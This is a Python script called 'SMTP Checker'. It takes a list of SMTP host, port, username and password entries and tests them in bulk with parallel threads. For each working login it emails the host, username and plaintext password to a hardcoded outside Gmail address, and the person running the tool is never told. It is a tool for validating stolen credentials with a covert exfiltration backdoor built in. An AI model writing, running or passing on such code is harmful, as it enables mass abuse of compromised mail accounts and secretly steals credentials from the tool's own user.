import os
import smtplib
import pyfiglet
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, init
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

TO_ADDR = "darkjohn507@gmail.com"

# Color
red = Fore.LIGHTRED_EX
cyan = Fore.LIGHTCYAN_EX
white = Fore.WHITE
green = Fore.LIGHTGREEN_EX

init(autoreset=True)


try:
    open("result.txt", "a")
except:
    pass

def banner(str):
    os.system("cls||clear")
    my_banner = pyfiglet.figlet_format(str, font="slant", justify="center")
    print(cyan + my_banner)
    print(f"\t\t\t{cyan}[ {green}Created By X-MrG3P5 {cyan}]\n")

def CheckSMTP(site):
    HOST, PORT, USER, PASS = site.strip().split("|")
    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(USER, PASS)
        msg = MIMEMultipart()
        msg["Subject"] = "SMTP Checker By X-MrG3P5"
        msg["From"] = USER
        msg["To"] = TO_ADDR
        msg.add_header("Content-Type", "text/html")
        DATA_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMTP Checker</title>
    <style>
        @media only screen and (max-width: 600px) {
            .inner-body {
                width: 100% !important;
            }
            
            .footer {
                width: 100% !important;
            }
        }
            
        @media only screen and (max-width: 500px) {
            .button {
                width: 100% !important;
            }
        }

        .container {
            background-color: black;
            display: flex;
            justify-content: center;
            border: 0.5px solid #EDEFF2;
        }

        body {
            background-color: black;
        }
        
        a {
            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
            font-weight: bold;
            font-size: 30px;
            color: red;
            text-decoration: none;
        }

        .cont2 {
            margin-top: 5px;
            background-color: black;
            width: 100%;
            height: 300px;
            border: 0.5px solid #EDEFF2;
        }

        p {
            margin-top: 40px;
            margin-left: 10px;
        }

        .cont2 > p {
            color: gray;
            font-weight: bold;
            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
        }
    </style>
</head>
<body>
    <div class="container">
        <a href="https://github.com/MrG3P5">SMTP Checker</a>
    </div>
    <div class="cont2">
        <p>HOST : """ + HOST + """</p>
        <p>PORT : """ + PORT + """</p>
        <p>USER : """ + USER + """</p>
        <p>PASS : """ + PASS + """</p>
    </div>
</body>
</html>"""
        msg.attach(MIMEText(DATA_HTML, "html", "utf-8"))
        server.sendmail(USER, [msg["To"]], msg.as_string())
        print(f"{cyan}[{green}SUKSES{cyan}] {white}{HOST}|{PORT}|{USER}|{PASS}")
        if f"{HOST}|{PORT}|{USER}|{PASS}" in open("result.txt", "r").read():
            pass
        else:
            open("result.txt", "a").write(f"{HOST}|{PORT}|{USER}|{PASS}" + "\n")
    except:
        print(f"{cyan}[{red}FAILED{cyan}] {white}{HOST}|{PORT}|{USER}|{PASS}")


if __name__=="__main__":
    banner("SMTP - Checker")
    print("Format SMTP server.com|25|user|pass\n")
    input_list = open(input(f"{cyan}[{white}?{cyan}] {white}SMTP LIST : "))
    Thread = input(f"{cyan}[{white}?{cyan}] {white}Thread : ")
    pool = ThreadPool(int(Thread))
    pool.map(CheckSMTP, input_list)
    pool.close()
    pool.join()
